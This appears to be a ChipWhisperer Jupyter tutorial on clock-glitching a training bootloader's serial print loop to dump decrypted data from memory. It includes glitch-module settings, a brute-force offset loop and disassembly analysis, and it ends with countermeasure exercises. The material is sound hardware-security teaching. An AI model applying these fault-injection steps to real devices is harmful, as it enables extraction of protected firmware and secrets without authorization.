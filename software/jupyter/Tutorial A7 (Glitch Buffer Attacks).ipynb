{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {
    "heading_collapsed": true
   },
   "source": [
    "# Tutorial A7 (Glitch Buffer Attacks)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "This tutorial discusses a specific type of glitch attack. It shows how a simple printing loop can be abused, causing a target to print some otherwise private information. This attack will be used to recover a plaintext without any knowledge of the encryption scheme being used."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "heading_collapsed": true,
    "hidden": true
   },
   "source": [
    "## Firmware"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "This section introduces the attack concept by showing some real world examples of vulnerable firmware. Then, it describes the victim firmware that will be used in this tutorial."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "heading_collapsed": true,
    "hidden": true
   },
   "source": [
    "### Real Firmware"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "Typically, one of the slowest parts of an embedded system is its communication lines. It's pretty common to see a processor running in the MHz range with a serial connection of 96k baud. To make these two different speeds work together, embedded firmware usually fills up a buffer with data and lets a serial driver print on its own time. This setup means we can expect to see code like:\n",
    "\n",
    "```C\n",
    "for(int i = 0; i < number_of_bytes_to_print; i++)\n",
    "{\n",
    "    print_one_byte_to_serial(buffer[i]);\n",
    "}\n",
    "```\n",
    "\n",
    "This is a pretty vulnerable piece of C. Imagine that we could sneak into the source code and change it to:\n",
    "\n",
    "```C\n",
    "for(int i = 0; i < really_big_number; i++)\n",
    "{\n",
    "    print_one_byte_to_serial(buffer[i]);\n",
    "}\n",
    "```\n",
    "\n",
    "C compilers don't care that `buffer[]` has a limited size - this loop will happily print every byte it comes across, which could include other variables, registers, and even source code. Although we probably don't have a good way of changing the source code on the fly, we do have glitches: a well-timed clock or power glitch could let us skip the `i < number_of_bytes_to_print` check, which would have the same result.\n",
    "\n",
    "How could this be applied? Imagine that we have an encrypted firmware image that we're going to transmit to a bootloader. A typical communication process might look like:\n",
    "\n",
    "1. We send the encrypted image ciphertexts over a serial connection\n",
    "1. The bootloader decrypts the ciphertexts and stores the result somewhere in memory\n",
    "1. The bootloader sends back a response over the serial port\n",
    "\n",
    "We have a pretty straightforward attack for this type of bootloader. During the last step, we'll apply a glitch at precisely the right time, causing the bootloader to print all kinds of things to the serial connection. With some luck, we'll be able to find the decrypted plaintext somewhere in this memory dump."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "heading_collapsed": true,
    "hidden": true
   },
   "source": [
    "### Building Firmware"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "For this tutorial, a very simple bootloader using the SimpleSerial protocol has been set up. The source for this bootloader can be found in `chipwhisperer/hardware/victims/firmware/bootloader-glitch`. The following commands are used:\n",
    "\n",
    "* `pABCD\\n`: Send an encrypted ciphertext to the bootloader. For example, this message is made up of the two bytes AB and CD.\n",
    "* `r0\\n\\n\\n\\n\\n\\n`: The reply from the bootloader. Acknowledges that a message was received. No other responses are used.\n",
    "* `x`: Clear the bootloader's received buffer.\n",
    "* `k`: See x.\n",
    "\n",
    "The bootloader uses triple-ROT-13 encryption to encrypt/decrypt the messages. To help you send messages to the target, the script private/encrypt.py prints the SimpleSerial command for a given fixed string. For example, the ciphertext for the string `Don't forget to buy milk!` is\n",
    "\n",
    "```\n",
    "p516261276720736265747267206762206f686c207a76797821\\n\n",
    "```\n",
    "\n",
    "Now that we've got some basic knowledge of the target code, build it, then navigate to the `bootloader-glitch` firmware directory:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "PLATFORM = \"CWLITEARM\"\n",
    "CRYPTO_TARGET=\"NONE\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "%%bash -s \"$PLATFORM\" \"$CRYPTO_TARGET\"\n",
    "cd ../../hardware/victims/firmware/bootloader-glitch\n",
    "make PLATFORM=$1 CRYPTO_TARGET=$2"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "heading_collapsed": true,
    "hidden": true
   },
   "source": [
    "## The Attack Plan"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "heading_collapsed": true,
    "hidden": true
   },
   "source": [
    "### The Sensitive Code"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "Inside `bootloader.c`, there are two buffers that are used to store most of the important data. The source code shows:\n",
    "```C\n",
    "#define DATA_BUFLEN 40\n",
    "#define ASCII_BUFLEN (2 * DATA_BUFLEN)\n",
    "\n",
    "uint8_t ascii_buffer[ASCII_BUFLEN];\n",
    "uint8_t data_buffer[DATA_BUFLEN];\n",
    "```\n",
    "\n",
    "This tells us that there will be two arrays stored somewhere in the target's memory. The AVR-GCC compiler doesn't usually try too hard to move these around, so we can expect to find them back-to-back in memory; that is, if we can read past the end of the ASCII buffer, we'll probably find the data buffer.\n",
    "\n",
    "Next, the code used to print a response to the serial port is:\n",
    "\n",
    "```C\n",
    "if(state == RESPOND)\n",
    "{\n",
    "\t// Send the ascii buffer back \n",
    "\ttrigger_high();\n",
    "\t\n",
    "\tint i;\n",
    "\tfor(i = 0; i < ascii_idx; i++)\n",
    "\t{\n",
    "\t\tputch(ascii_buffer[i]);\n",
    "\t}\n",
    "\ttrigger_low();\n",
    "\tstate = IDLE;\n",
    "}\n",
    "```\n",
    "\n",
    "This looks very similar to the example code given in the previous section, so it should be vulnerable to a glitching attack. The goal is to cause the loop to continue past its regular limit: `data_buffer[0]` is the same as `ascii_buffer[80]`, so a successful glitch should dump the data buffer for us."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "heading_collapsed": true,
    "hidden": true
   },
   "source": [
    "### Disassembly"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "As a final step, let's check the assembly code to see exactly what we're trying to glitch through. In the same folder as the hex file you built, open the `*.lss` file that corresponds to your target (for example, `bootloader-CWLITEARM.lss`). This is called a listing file, and it contains a bunch of debug and assembly information. Most importantly, it will allow us to easily match the source code to what's in our hex file. Search the file for something close to the vulnerable loop, such as `state == RESPOND`."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "heading_collapsed": true,
    "hidden": true
   },
   "source": [
    "#### Compiler Optimizations"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "While reading the section on the bootloader commands, you may have been surprised to see more than one newline at the end of the respond command (`r0\\n\\n\\n\\n\\n\\n`). Because the response is both so short and always the same length, the compiler will perform loop unrolling. Loop unrolling is an optimization that trades code size for speed by replacing a constant size loop:\n",
    "\n",
    "```C\n",
    "for (int i = 0; i < 3; i++) \n",
    "    do_something();\n",
    "```\n",
    "\n",
    "by a repeated sequence of the loop's operations:\n",
    "\n",
    "```C\n",
    "do_something();\n",
    "do_something();\n",
    "do_something();\n",
    "```\n",
    "\n",
    "For a small number of repititions, size-speed tradeoff is skewed towards the latter, making it very hard to get the compiler not to perform the optimization, thus we simply increase the size of the loop. Most bootloaders have multiple different reponses with varying length, so this isn't a typical obstacle you would face, but it is important for this situation.\n",
    "\n",
    "The [Wikipedia page on loop unrolling](https://en.wikipedia.org/wiki/Loop_unrolling) contains more information on the topic if you're like to learn more."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "heading_collapsed": true,
    "hidden": true
   },
   "source": [
    "#### XMEGA Disassembly"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "After searching the file, you should see something like this:\n",
    "\n",
    "```asm\n",
    " 38c:\t89 91       \tld\tr24, Y+\n",
    " 38e:\t0e 94 38 02 \tcall\t0x470\t; 0x470 <output_ch_0>\n",
    " 392:\tf0 e2       \tldi\tr31, 0x20\t; 32\n",
    " 394:\tc4 38       \tcpi\tr28, 0x84\t; 132\n",
    " 396:\tdf 07       \tcpc\tr29, r31\n",
    " 398:\tc9 f7       \tbrne\t.-14     \t; 0x38c <main+0xbc>\n",
    "\n",
    "```\n",
    "\n",
    "This is our printing loop in assembly. It has the following steps in it:\n",
    "\n",
    "* Look at the address `Y` and put the contents into `r24`. Increase the address stored in `Y`. (This is the i++ in the loop.)\n",
    "* Call the function in location `0x470`. Presumably, this is the location of the `putch()` function.\n",
    "* Compare `r28` and `r29` to `0x84` and `0x20`. Unless they're equal, go back to the top of the loop.\n",
    "\n",
    "There's one quirk to notice in this code. In the C source, the for loop checks whether `i < ascii_idx`. However, in the assembly code, the check is effectively whether `i == ascii_idx`! This is even easier to glitch - as long as we can break past the `brne` instruction once, we'll get to the data buffer."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "heading_collapsed": true,
    "hidden": true
   },
   "source": [
    "#### Arm Disassembly"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "After searching the file, you should see something like this:\n",
    "\n",
    "```asm\n",
    " 8000268:\t5d28      \tldrb\tr0, [r5, r4]\n",
    " 800026a:\t3401      \tadds\tr4, #1\n",
    " 800026c:\tf000 f8f2 \tbl\t8000454 <putch>\n",
    " 8000270:\t2c08      \tcmp\tr4, #8\n",
    " 8000272:\td1f9      \tbne.n\t8000268 <main+0x64>\n",
    "```\n",
    "\n",
    "We can break this assembly down into the following steps:\n",
    "\n",
    "* Load the character we want to print into `r0` (`r5` contains the address of `ascii_buffer`, while `r4` is our loop index `i`)\n",
    "* Add 1 to `r4` (`i`)\n",
    "* Call `putch`\n",
    "* Compare `r4` to 8 (8 is always the value of `ascii_idx`)\n",
    "* Branch back to the beginning of the loop if `r4` and 8 aren't equal\n",
    "\n",
    "There's one quirk to notice in this code. In the C source, the for loop checks whether `i < ascii_idx`. However, in the assembly code, the check is effectively whether `i == ascii_idx`! This is even easier to glitch - as long as we can break past the `brne` instruction once, we'll get to the data buffer."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "heading_collapsed": true,
    "hidden": true
   },
   "source": [
    "## The Attack Script"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "heading_collapsed": true,
    "hidden": true
   },
   "source": [
    "### Setup"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "Now that we know what our target is, we can start creating our attack script. Basic setup is the same as usual:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "%run \"Helper Scripts/CWLite_Connect.ipynb\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "%run \"Helper Scripts/Setup_Target_Generic.ipynb\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "# uncomment based on your target\n",
    "#%run \"Helper Scripts/Program_XMEGA.ipynb\"\n",
    "%run \"Helper Scripts/Program_STM.ipynb\"\n",
    "#%run \"Helper Scripts/No_Programmer.ipynb\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "fw_path = \"../../hardware/victims/firmware/bootloader-glitch/bootloader-CWLITEARM.hex\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "program_target(scope, fw_path)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "And setup the glitch module:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "scope.glitch.clk_src = 'clkgen'\n",
    "scope.glitch.output = \"clock_xor\"\n",
    "scope.io.hs2 = \"glitch\"\n",
    "scope.glitch.trigger_src = 'ext_single'\n",
    "scope.glitch.repeat = 1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "heading_collapsed": true,
    "hidden": true
   },
   "source": [
    "#### XMEGA Settings"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "scope.glitch.offset = -1.95\n",
    "scope.glitch.width = -9.1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "heading_collapsed": true,
    "hidden": true
   },
   "source": [
    "#### Arm Settings"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "scope.glitch.offset = -40\n",
    "scope.glitch.width = -5.5"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "heading_collapsed": true,
    "hidden": true
   },
   "source": [
    "### Communicating With Bootloader"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "Now that we have our setup done, let's work on communicating with the bootloader. There's a few ways to do this, but the easiest is probably to use `target.ser.write` to send our text. Remember, to get to the print buffer, we need to send some `rot13` encoded text. For this example, we'll use `Don't forget to buy milk!`, whose `rot13` encoding is `516261276720736265747267206762206f686c207a76797821`.\n",
    "\n",
    "Let's also change the ADC clock from being x4 of the target clock to being x1. This way, we can easily use the ADC module (in particular `scope.adc.trig_count`) to see how long sending the response takes."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "scope.clock.adc_src = \"clkgen_x1\"\n",
    "def send_milk(ser):\n",
    "    cmd = \"p516261276720736265747267206762206f686c207a76797821\\n\"\n",
    "    ser.write(cmd)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "Next, let's send the command to the bootloader, observe the response, and measure how long it took."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "import time\n",
    "scope.glitch.output = \"clock_only\" #disable any glitches\n",
    "scope.arm()\n",
    "send_milk(target.ser)\n",
    "time.sleep(0.1)\n",
    "scope.capture()\n",
    "num_chars = target.ser.inWaiting()\n",
    "response = target.ser.read(num_chars, timeout=50)\n",
    "print(response)\n",
    "print(\"The response took {} cycles\".format(scope.adc.trig_count))\n",
    "scope.glitch.output = \"clock_xor\" #reenable glitch"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "In this case, we got a trigger active count of 17014 cycles. Remember, we want to glitch the final few instructions of the loop, so our glitch point will be just before the end (say somewhere in the last 50 cycles)."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "heading_collapsed": true,
    "hidden": true
   },
   "source": [
    "### Glitch Loop "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "We're almost ready to create our glitch loop! Before we do, there's a few things to keep in mind. The first is dealing with crashes. As you might expect, we'll often crash the target instead of getting the glitch we want. In this case, we'll need to reset the target before we try communicating with the bootloader. Luckily we can tell if we crashed the target by looking at the state of the trigger pin: if the target crashes, it will never go low (this also happens with a successful glitch, but we'll be checking for success in the response, so this isn't much of an issue). We can check this via `scope.adc.state`.\n",
    "\n",
    "To reset the target, we'll define a simple function. Note that you'll have to uncomment the pin setup for your target (`nrst` or `pdic`)."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "def reset_target(scope):\n",
    "    scope.io.nrst = 'low'\n",
    "    #scope.io.pdic = 'low'\n",
    "    time.sleep(0.05)\n",
    "    scope.io.nrst = 'high'\n",
    "    #scope.io.pdic = 'high'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "This part is optional, but to make the response easier to read, we'll also want to do some parsing on the response text, since the response won't all be in ASCII text. This will make use of the `termcolor` module to make non letter/number responses red, which doesn't come with ChipWhisperer and only works on Jupyter/Unix. If you're following along in a Windows command prompt or don't want to install this module, feel free to remove the import and the `colored()` calls."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "from termcolor import colored\n",
    "def my_print(text):\n",
    "    for ch in text:\n",
    "        if (ord(ch) > 31 and ord(ch) < 127) or ch == \"\\n\": \n",
    "            print(ch, end='')\n",
    "        else:\n",
    "            print(colored(\"0x{:02X}\".format(ord(ch)), 'red'), end='')\n",
    "        print(\"\", end='')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "We can finally proceed on to our actual loop. We might need a few tries at each location, so we'll run the loop infinitely until we get it.\n",
    "\n",
    "As was mentioned earlier, we'll also need to check for a successful glitch to avoid resetting while we're still receiving data. This will also enable us to read the full serial output, since the target will be sending back a lot of data (much more than we can receive in one `ser.read()`). \n",
    "\n",
    "Careful inspection of the source reveals that most of what we sent to the device is still in the `ascii_buffer` (with the first 8 or so characters being overwritten). That means we can check for one of the characters after the overwritten part (say `\"7\"`).\n",
    "\n",
    "After we're sure we have a glitch, we can just keep looking for more data and printing it.\n",
    "\n",
    "**Make sure you update the values in the `range` call to reflect what you got earlier in the tutorial**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hidden": true,
    "scrolled": false
   },
   "outputs": [],
   "source": [
    "target.init()\n",
    "reset_target(scope)\n",
    "print(\"Init\")\n",
    "from tqdm import trange\n",
    "import logging\n",
    "logging.basicConfig(level=logging.CRITICAL)\n",
    "while True:\n",
    "    for i in range(16990, 16995, 1):\n",
    "        \n",
    "        if scope.adc.state:\n",
    "            #trigger never went low, target probably crashed\n",
    "            reset_target(scope)\n",
    "            #print(\"Crashed!\")\n",
    "            \n",
    "        scope.glitch.ext_offset = i\n",
    "        scope.arm()\n",
    "        send_milk(target.ser)\n",
    "        while target.isDone() is False and timeout:\n",
    "            timeout -= 1\n",
    "            time.sleep(0.01)\n",
    "\n",
    "        try:\n",
    "            ret = scope.capture()\n",
    "            if ret:\n",
    "                reset_target(scope)\n",
    "                continue\n",
    "        except IOError as e:\n",
    "            logging.error('IOError: %s' % str(e))\n",
    "            \n",
    "        waiting = target.ser.inWaiting()\n",
    "        output = target.ser.read(waiting, timeout=50)\n",
    "        \n",
    "        #check if we were successful\n",
    "        if \"7\" in output:\n",
    "            print(\"Glitched! Offset was at {}\".format(i))\n",
    "            my_print(output)\n",
    "            while True:\n",
    "                waiting = target.ser.inWaiting()\n",
    "                if waiting:\n",
    "                    output = target.ser.read(waiting, timeout=50)\n",
    "                    my_print(output)\n",
    "                    \n",
    "        if scope.adc.state:\n",
    "            #trigger never went low, target probably crashed\n",
    "            reset_target(scope)\n",
    "            #print(\"Crashed! Output: {}\".format(output))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "With any luck, you should see a whole bunch of text printed to the screen.\n",
    "\n",
    "You should be able to the plaintext near the beginning of the output! The data buffer has successfully been printed to the serial port, allowing us to see the decrypted text with no knowledge of the algorithm. Now that we've got a successful glitch, stop the cell above (since it's still looking for more stuff to print) and let's disconnect the scope and target:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "scope.dis()\n",
    "target.dis()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "heading_collapsed": true,
    "hidden": true
   },
   "source": [
    "## Ideas"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "There's a lot more that can be done with this type of attack..."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "heading_collapsed": true,
    "hidden": true
   },
   "source": [
    "### Safer Assembly Code"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "You may have been surprised to see that the assembly code uses a `brne` instruction to check if the loop is finished - after all, we used a less-than comparison in our C source code! Try changing this line to use a more prohibitive loop. Here's how you might do this:"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "heading_collapsed": true,
    "hidden": true
   },
   "source": [
    "### Volatile Variables"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "The reason why the original assembly code used the brne instruction is because GCC is an *optimizing compiler*. The compiler doesn't directly translate the C source code into assembly instructions. Instead, it tries to determine if any of the code can be modified to make it faster or more compact. For instance, consider the loop:\n",
    "\n",
    "```C\n",
    "for(int i = 0; i < 10; i++)\n",
    "{\n",
    "    if(i < 20)\n",
    "        printf(\"%s\", \"Less\");\n",
    "    else\n",
    "        printf(\"%s\", \"Greater\");\n",
    "}\n",
    "```\n",
    "\n",
    "If you take a careful look at this code, you'll notice that the following loop will produce the same output:\n",
    "\n",
    "```C\n",
    "for(int i = 0; i < 10; i++)\n",
    "{\n",
    "    printf(\"%s\", \"Less\");\n",
    "}\n",
    "```\n",
    "\n",
    "However, this second loop is smaller (less code) and faster (no conditional jumps). This is the kind of optimization a compiler can make.\n",
    "\n",
    "There are several ways we can stop the compiler from making some of these assumptions. One of these methods uses volatile variables, which look like\n",
    "\n",
    "```C\n",
    "volatile int i;\n",
    "```\n",
    "\n",
    "A volatile variable is one that could change at any time. There could be many reasons why the value might change on us:\n",
    "\n",
    "* Another thread might have access to the same memory location\n",
    "* Another part of the computer might be able to change the variable's value (example: direct memory access)\n",
    "* The variable might not actually be stored anywhere - it could be a read-only register in an embedded system\n",
    "\n",
    "In any case, the `volatile` keyword tells the compiler to make no guarantees about this variable.\n",
    "\n",
    "Try changing the bootloader's source code to use a volatile variable inside the loop. What happens to the disassembly? Is the loop body longer? Connect to the target board and capture a power trace. Does it look different? You'll have to find a new *Ext Trigger Offset* for the glitch module. Can you still perform the attack? Is it feasible to use this fix to avoid glitching attacks?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.6"
  },
  "toc": {
   "base_numbering": 1,
   "nav_menu": {},
   "number_sections": true,
   "sideBar": true,
   "skip_h1_title": true,
   "title_cell": "Table of Contents",
   "title_sidebar": "Contents",
   "toc_cell": false,
   "toc_position": {},
   "toc_section_display": true,
   "toc_window_display": true
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
